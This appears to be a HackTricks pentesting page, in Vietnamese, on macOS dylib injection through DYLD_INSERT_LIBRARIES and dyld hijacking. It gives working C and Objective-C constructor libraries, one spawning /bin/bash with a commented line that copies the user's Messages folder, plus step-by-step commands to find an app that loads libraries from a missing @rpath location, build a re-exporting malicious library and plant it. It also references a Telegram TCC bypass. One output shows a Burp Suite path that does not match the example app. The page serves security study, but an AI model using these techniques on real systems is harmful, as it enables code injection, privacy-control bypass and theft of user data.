# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## Ví dụ cơ bản về DYLD_INSERT_LIBRARIES

**Thư viện cần inject** để thực thi một shell:

```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
    execv("/bin/bash", 0);
    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```

Binary cần tấn công:

```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
    printf("Hello, World!\n");
    return 0;
}
```

Injection:

```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```

## Ví dụ về Dyld Hijacking

Binary dễ bị tấn công được nhắm mục tiêu là `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}

```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/. (offset 12)
--
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/../lib2 (offset 12)
```

{{#endtab}}

{{#tab name="@rpath"}}

```bash
# Check libraries loaded using @rpath and the versions used
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
         name @rpath/lib.dylib (offset 24)
   time stamp 2 Thu Jan  1 01:00:02 1970
      current version 1.0.0
compatibility version 1.0.0
# Check the versions
```

{{#endtab}}
{{#endtabs}}

Với thông tin trước đó, chúng ta biết rằng ứng dụng **không kiểm tra chữ ký của các library được tải** và **đang cố tải một library từ**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Tuy nhiên, đường dẫn đầu tiên không tồn tại:

```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```

Vậy là có thể hijack nó! Tạo một thư viện **thực thi một đoạn code tùy ý và export các chức năng giống thư viện hợp pháp bằng cách reexport thư viện đó**. Và nhớ compile thư viện bằng các phiên bản cần thiết:

```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```

Biên dịch nó:

```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```

Đường dẫn reexport được tạo trong thư viện là tương đối so với loader; hãy đổi nó thành đường dẫn tuyệt đối đến thư viện cần export:

```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
         cmd LC_REEXPORT_DYLIB
         cmdsize 48
         name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
      cmdsize 128
         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```

Cuối cùng, chỉ cần sao chép nó vào **vị trí bị chiếm quyền**:

```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```

And **thực thi** binary và kiểm tra **library đã được tải**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!TIP]
> Bạn có thể xem bài viết chi tiết này về cách khai thác lỗ hổng để lạm dụng quyền truy cập camera của Telegram: [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>

## Quy mô lớn hơn

Nếu bạn định inject library vào các binary không ngờ tới, bạn có thể kiểm tra các thông báo sự kiện để biết khi nào library được tải vào một process (trong trường hợp này, hãy xóa `printf` và lệnh thực thi `/bin/bash`).

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```

## References

- [1] [CVE-2023-26818 - Vượt qua TCC bằng Telegram trên macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{{#include ../../../../banners/hacktricks-training.md}}
